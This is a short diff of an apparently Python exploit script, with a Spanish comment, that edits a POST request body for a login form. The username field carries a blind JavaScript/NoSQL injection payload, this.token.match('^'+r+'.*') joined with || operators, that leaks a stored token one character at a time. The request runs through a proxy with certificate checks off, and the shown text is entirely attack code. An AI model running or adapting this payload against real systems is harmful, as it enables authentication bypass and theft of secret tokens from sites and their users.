@@ -8,7 +8,7 @@ def request(r):
                      headers={   
         "Content-Type":"application/x-www-form-urlencoded"
         }, 
-        data="username=\"+0||+this.token.match('^"+str(r)+".*')+||+\"\"%3d%3d\"//password=test", #### data a enviar en el formulario
+        data="username=\"+||+this.token.match('^"+str(r)+".*')+||+\"\"%3d%3d\"//&password=test", #### data a enviar en el formulario
         proxies=proxies,
         verify=False
         )
